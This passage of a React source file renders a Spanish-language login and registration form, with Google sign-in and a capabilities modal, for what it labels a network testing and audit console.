              // onMouseLeave={handleMouseLeave}
              style={{
                transform: `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg)`,
                transition: "transform 0.15s ease-out"
              }}
              className={`overflow-hidden rounded-2xl border backdrop-blur-2xl transition-all duration-300 ${isDarkMode
                ? "border-white/10 bg-slate-900/60 shadow-2xl shadow-black/80"
                : "border-slate-200/80 bg-white/90 shadow-2xl shadow-slate-300/50"
                }`}
            >
              <div className="h-px w-full bg-gradient-to-r from-transparent via-emerald-500/50 to-transparent" />

              <div className="p-8 sm:p-10">
                <div className="mb-6 flex items-center justify-between">
                  <div>
                    <h1 className={`text-2xl font-bold tracking-tight font-mono ${isDarkMode ? "text-white" : "text-slate-900"}`}>
                      {isRegister ? "Crear Cuenta" : "Iniciar Sesión"}
                    </h1>
                    <p className={`text-xs font-mono mt-1 ${isDarkMode ? "text-slate-400" : "text-slate-500"}`}>
                      Consola de Pruebas y Auditoría de Red
                    </p>
                  </div>
                  <div className={`rounded-md px-2 py-1 text-[10px] font-mono font-bold uppercase border ${isDarkMode ? "border-emerald-500/30 bg-emerald-500/10 text-emerald-400" : "border-emerald-600/30 bg-emerald-50 text-emerald-700"}`}>
                    v2.4_prod
                  </div>
                </div>

                {/* Toggle Login / Register */}
                <div className={`mb-6 flex rounded-xl p-1 border font-mono text-xs ${isDarkMode ? "border-white/10 bg-white/5" : "border-slate-200 bg-slate-100"}`}>
                  <button
                    type="button"
                    onClick={() => { setIsRegister(false); setErrors({}); setError(null); }}
                    className={`flex-1 rounded-lg py-2 transition-all duration-200 font-semibold ${!isRegister ? (isDarkMode ? "bg-emerald-500 text-slate-950 shadow-md" : "bg-emerald-600 text-white shadow-md") : (isDarkMode ? "text-slate-400 hover:text-white" : "text-slate-600 hover:text-slate-900")}`}
                  >
                    LOGIN
                  </button>
                  <button
                    type="button"
                    onClick={() => { setIsRegister(true); setErrors({}); setError(null); }}
                    className={`flex-1 rounded-lg py-2 transition-all duration-200 font-semibold ${isRegister ? (isDarkMode ? "bg-emerald-500 text-slate-950 shadow-md" : "bg-emerald-600 text-white shadow-md") : (isDarkMode ? "text-slate-400 hover:text-white" : "text-slate-600 hover:text-slate-900")}`}
                  >
                    REGISTRO
                  </button>
                </div>

                {error && (
                  <div className={`mb-6 flex items-center gap-2.5 rounded-xl border p-3 text-xs font-mono ${error.includes("creada")
                    ? "border-emerald-500/30 bg-emerald-500/10 text-emerald-400"
                    : "border-rose-500/30 bg-rose-500/10 text-rose-400"}`}>
                    {error.includes("creada")
                      ? <CheckCircle2 className="h-4 w-4 shrink-0 text-emerald-500" />
                      : <AlertTriangle className="h-4 w-4 shrink-0 text-rose-500" />
                    }
                    <span>{error}</span>
                  </div>
                )}

                {/* Google Auth Button */}
                <button
                  type="button"
                  onClick={handleGoogleAuth}
                  disabled={isLoading}
                  className={`mb-5 flex w-full items-center justify-center gap-3 rounded-xl border py-3 text-xs font-mono font-semibold transition-all duration-200 ${isDarkMode
                    ? "border-white/10 bg-white/5 text-slate-200 hover:bg-white/10"
                    : "border-slate-200 bg-white text-slate-700 hover:bg-slate-50 shadow-sm"
                    }`}
                >
                  <svg className="h-4 w-4" viewBox="0 0 24 24">
                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" />
                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" />
                  </svg>
                  <span>{isRegister ? "Registrarse con Google" : "Iniciar sesión con Google"}</span>
                </button>

                {/* Divider */}
                <div className="relative mb-5 flex items-center justify-center">
                  <div className={`h-px w-full ${isDarkMode ? "bg-white/10" : "bg-slate-200"}`} />
                  <span className={`absolute px-3 text-[10px] font-mono uppercase ${isDarkMode ? "bg-slate-900 text-slate-500" : "bg-white text-slate-400"}`}>
                    O mediante correo
                  </span>
                </div>

                <form onSubmit={handleSubmit} className="space-y-4">
                  {!isRegister ? (
                    /* LOGIN: Usuario o Email */
                    <div className="space-y-1.5">
                      <label htmlFor="loginInput" className={`block text-xs font-mono font-semibold uppercase tracking-wider ${isDarkMode ? "text-slate-400" : "text-slate-600"}`}>
                        Usuario o Correo Electrónico
                      </label>
                      <div className={`relative flex items-center rounded-xl border transition-all duration-200 ${isFocused
                        ? (isDarkMode ? "border-emerald-500 bg-emerald-500/5 ring-1 ring-emerald-500/30" : "border-emerald-600 bg-emerald-50/50 ring-1 ring-emerald-600/30")
                        : (isDarkMode ? "border-white/10 bg-white/5" : "border-slate-200 bg-slate-50")
                        }`}>
                        <div className="pointer-events-none flex h-full items-center pl-3.5">
                          <User className={`h-4 w-4 transition-colors ${isFocused ? (isDarkMode ? "text-emerald-400" : "text-emerald-600") : "text-slate-500"}`} />
                        </div>
                        <input
                          id="loginInput"
                          type="text"
                          value={loginInput}
                          onChange={(e) => setLoginInput(e.target.value)}
                          onFocus={() => setIsFocused(true)}
                          onBlur={() => setIsFocused(false)}
                          placeholder="Usuario o correo"
                          className={`w-full bg-transparent py-3 pl-3 pr-4 text-sm font-mono outline-none ${isDarkMode ? "text-white placeholder-slate-600" : "text-slate-900 placeholder-slate-400"}`}
                          disabled={isLoading}
                        />
                      </div>
                      {errors.loginInput && <p className="text-[11px] font-mono text-rose-500 mt-1">{errors.loginInput}</p>}
                    </div>
                  ) : (
                    /* REGISTRO: Usuario + Email */
                    <>
                      <div className="space-y-1.5">
                        <label htmlFor="username" className={`block text-xs font-mono font-semibold uppercase tracking-wider ${isDarkMode ? "text-slate-400" : "text-slate-600"}`}>
                          Nombre de Usuario
                        </label>
                        <div className={`relative flex items-center rounded-xl border transition-all duration-200 ${isDarkMode ? "border-white/10 bg-white/5" : "border-slate-200 bg-slate-50"
                          }`}>
                          <div className="pointer-events-none flex h-full items-center pl-3.5">
                            <User className="h-4 w-4 text-slate-500" />
                          </div>
                          <input
                            id="username"
                            type="text"
                            value={username}
                            onChange={(e) => setUsername(e.target.value)}
                            placeholder="Ej: operator_01"
                            className={`w-full bg-transparent py-3 pl-3 pr-4 text-sm font-mono outline-none ${isDarkMode ? "text-white placeholder-slate-600" : "text-slate-900 placeholder-slate-400"}`}
                            disabled={isLoading}
                          />
                        </div>
                        {errors.username && <p className="text-[11px] font-mono text-rose-500 mt-1">{errors.username}</p>}
                      </div>

                      <div className="space-y-1.5">
                        <label htmlFor="email" className={`block text-xs font-mono font-semibold uppercase tracking-wider ${isDarkMode ? "text-slate-400" : "text-slate-600"}`}>
                          Correo Electrónico
                        </label>
                        <div className={`relative flex items-center rounded-xl border transition-all duration-200 ${isDarkMode ? "border-white/10 bg-white/5" : "border-slate-200 bg-slate-50"
                          }`}>
                          <div className="pointer-events-none flex h-full items-center pl-3.5">
                            <Mail className="h-4 w-4 text-slate-500" />
                          </div>
                          <input
                            id="email"
                            type="email"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            placeholder="operador@secsuite.io"
                            className={`w-full bg-transparent py-3 pl-3 pr-4 text-sm font-mono outline-none ${isDarkMode ? "text-white placeholder-slate-600" : "text-slate-900 placeholder-slate-400"}`}
                            disabled={isLoading}
                          />
                        </div>
                        {errors.email && <p className="text-[11px] font-mono text-rose-500 mt-1">{errors.email}</p>}
                      </div>
                    </>
                  )}

                  {/* Password */}
                  <div className="space-y-1.5">
                    <label htmlFor="password" className={`block text-xs font-mono font-semibold uppercase tracking-wider ${isDarkMode ? "text-slate-400" : "text-slate-600"}`}>
                      Contraseña
                    </label>
                    <div className={`relative flex items-center rounded-xl border transition-all duration-200 ${isDarkMode ? "border-white/10 bg-white/5" : "border-slate-200 bg-slate-50"
                      }`}>
                      <div className="pointer-events-none flex h-full items-center pl-3.5">
                        <Lock className="h-4 w-4 text-slate-500" />
                      </div>
                      <input
                        id="password"
                        type="password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="••••••••••••"
                        className={`w-full bg-transparent py-3 pl-3 pr-4 text-sm font-mono outline-none ${isDarkMode ? "text-white placeholder-slate-600" : "text-slate-900 placeholder-slate-400"}`}
                        disabled={isLoading}
                      />
                    </div>
                    {errors.password && <p className="text-[11px] font-mono text-rose-500 mt-1">{errors.password}</p>}
                  </div>

                  {/* Confirm Password (solo Registro) */}
                  {isRegister && (
                    <div className="space-y-1.5">
                      <label htmlFor="confirmPassword" className={`block text-xs font-mono font-semibold uppercase tracking-wider ${isDarkMode ? "text-slate-400" : "text-slate-600"}`}>
                        Repetir Contraseña
                      </label>
                      <div className={`relative flex items-center rounded-xl border transition-all duration-200 ${isDarkMode ? "border-white/10 bg-white/5" : "border-slate-200 bg-slate-50"
                        }`}>
                        <div className="pointer-events-none flex h-full items-center pl-3.5">
                          <Lock className="h-4 w-4 text-slate-500" />
                        </div>
                        <input
                          id="confirmPassword"
                          type="password"
                          value={confirmPassword}
                          onChange={(e) => setConfirmPassword(e.target.value)}
                          placeholder="••••••••••••"
                          className={`w-full bg-transparent py-3 pl-3 pr-4 text-sm font-mono outline-none ${isDarkMode ? "text-white placeholder-slate-600" : "text-slate-900 placeholder-slate-400"}`}
                          disabled={isLoading}
                        />
                      </div>
                      {errors.confirmPassword && <p className="text-[11px] font-mono text-rose-500 mt-1">{errors.confirmPassword}</p>}
                    </div>
                  )}

                  <button
                    type="submit"
                    disabled={isLoading}
                    className={`group relative flex w-full items-center justify-center gap-2 overflow-hidden rounded-xl py-3.5 text-sm font-semibold transition-all duration-200 shadow-lg mt-2 ${isLoading ? "opacity-75 cursor-not-allowed" : "hover:scale-[1.01] active:scale-[0.99]"
                      } ${isDarkMode
                        ? "bg-emerald-500 text-slate-950 hover:bg-emerald-400 shadow-emerald-500/20"
                        : "bg-emerald-600 text-white hover:bg-emerald-500 shadow-emerald-600/20"
                      }`}
                  >
                    <span className="font-mono uppercase tracking-wider">
                      {isLoading
                        ? "Verificando Credenciales..."
                        : isRegister
                          ? "Crear Cuenta / Registrar"
                          : "Bypassing Gate / Acceder"}
                    </span>
                    <ArrowRight className={`h-4 w-4 transition-transform duration-200 ${isLoading ? "animate-spin" : "group-hover:translate-x-1"}`} />
                  </button>
                </form>

                {/* Interactive Capability Selectors */}
                <div className="mt-8 pt-6 border-t border-slate-500/10">
                  <span className={`block text-[11px] font-mono uppercase tracking-wider mb-3 ${isDarkMode ? "text-slate-400" : "text-slate-500"}`}>
                    Capacidades del Sistema
                  </span>
                  <div className="grid grid-cols-2 gap-2">
                    {Object.keys(CAPABILITIES_INFO).map((capKey) => {
                      const cap = CAPABILITIES_INFO[capKey];
                      const Icon = cap.icon;
                      return (
                        <button
                          key={capKey}
                          type="button"
                          onClick={() => setSelectedCapability(capKey)}
                          className={`flex items-center gap-2 rounded-lg p-2 text-left text-xs font-mono transition-all duration-200 border ${isDarkMode
                            ? "border-white/5 bg-white/5 hover:bg-white/10 text-slate-300"
                            : "border-slate-200 bg-slate-50 hover:bg-slate-100 text-slate-700"
                            }`}
                        >
                          <Icon className="h-3.5 w-3.5 shrink-0 text-emerald-500" />
                          <span className="truncate text-[11px]">{capKey}</span>
                        </button>
                      );
                    })}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>

        {/* Modal interactivo de información de Capacidades */}
        <AnimatePresence>
          {selectedCapability && activeCap && (
            <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-md">
              <motion.div
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.95 }}
                transition={{ duration: 0.2 }}
                className={`relative w-full max-w-lg overflow-hidden rounded-2xl border ${colorScheme.border} ${isDarkMode ? "bg-slate-900 text-white" : "bg-white text-slate-900"} p-6 shadow-2xl ${colorScheme.glowBorder}`}
              >
                <div className="flex items-start justify-between border-b border-slate-500/10 pb-4">
                  <div className="flex items-center gap-3">
                    <div className={`flex h-10 w-10 items-center justify-center rounded-xl border ${colorScheme.badgeBg}`}>
                      <activeCap.icon className={`h-5 w-5 ${colorScheme.textAccent}`} />
                    </div>
                    <div>
                      <span className={`inline-block rounded px-1.5 py-0.5 text-[10px] font-mono font-bold border ${colorScheme.badgeBg}`}>
                        {activeCap.badge}
                      </span>
                      <h3 className="text-base font-bold font-mono tracking-tight mt-1">
                        {activeCap.title}
                      </h3>
                    </div>
                  </div>
                  <button
                    onClick={() => setSelectedCapability(null)}
                    className={`rounded-lg p-1.5 transition-colors ${isDarkMode ? "hover:bg-white/10 text-slate-400" : "hover:bg-slate-100 text-slate-500"}`}
                  >
                    <X className="h-5 w-5" />
                  </button>
                </div>

                <div className="py-4 space-y-4">
                  <p className={`text-xs leading-relaxed ${isDarkMode ? "text-slate-300" : "text-slate-600"}`}>
                    {activeCap.description}
                  </p>

                  <div className="space-y-2">
                    <span className={`text-[11px] font-mono font-semibold uppercase tracking-wider block ${isDarkMode ? "text-slate-400" : "text-slate-500"}`}>
                      Especificaciones Técnicas:
                    </span>
                    <ul className="space-y-2">
                      {activeCap.details.map((detail, idx) => (
                        <li key={idx} className="flex items-start gap-2 text-xs">
                          <CheckCircle2 className={`h-4 w-4 shrink-0 mt-0.5 ${colorScheme.textAccent}`} />
                          <span className={isDarkMode ? "text-slate-300" : "text-slate-700"}>{detail}</span>
                        </li>
                      ))}
                    </ul>
                  </div>
                </div>

                <div className="mt-4 pt-3 border-t border-slate-500/10 flex justify-end">
                  <button
                    type="button"
                    onClick={() => setSelectedCapability(null)}
                    className={`px-4 py-2 text-xs font-mono font-semibold rounded-lg transition-all ${colorScheme.buttonAccent}`}
                  >
                    Entendido / Cerrar
                  </button>
                </div>
              </motion.div>
            </div>
          )}
        </AnimatePresence>
      </div>
    </>
  );
}

export default function LoginPage() {
  return (
    <GoogleOAuthProvider clientId="915931850576-074o3qln7h7q7cdhq7bea27d8pmuiiq2.apps.googleusercontent.com">
      <LoginForm />
    </GoogleOAuthProvider>
  );
}